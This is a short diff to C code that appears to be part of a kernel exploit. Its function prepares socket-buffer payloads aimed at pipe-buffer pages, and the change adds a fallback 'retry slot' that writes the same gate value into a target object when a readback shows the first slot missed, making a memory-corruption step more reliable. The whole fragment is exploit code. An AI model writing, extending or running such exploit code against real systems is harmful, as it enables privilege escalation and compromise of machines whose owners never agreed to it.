@@ -1748,6 +1748,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           target = pipebuf_page_base +
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
           p0_gate_page_struct = parent;
+#if defined(P0_ORACLE_GATE_RETRY_SLOT)
+        } else if (slot == P0_ORACLE_GATE_RETRY_SLOT &&
+                   !app_fops_page_reuse_enabled()) {
+          /* A second independent waiter bank writes the same gate value.
+           * It is selected only after a nondestructive readback proves that
+           * slot 0 missed, and only while slot 6 is not needed for page reuse. */
+          parent = p0_gate_page_struct;
+          target = pipebuf_page_base +
+                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+#endif
         } else if (slot >= P0_ORACLE_PROBE_SLOT &&
                    slot < P0_ORACLE_PROBE_SLOT +
                               P0_ORACLE_PROBE_SLOT_COUNT) {
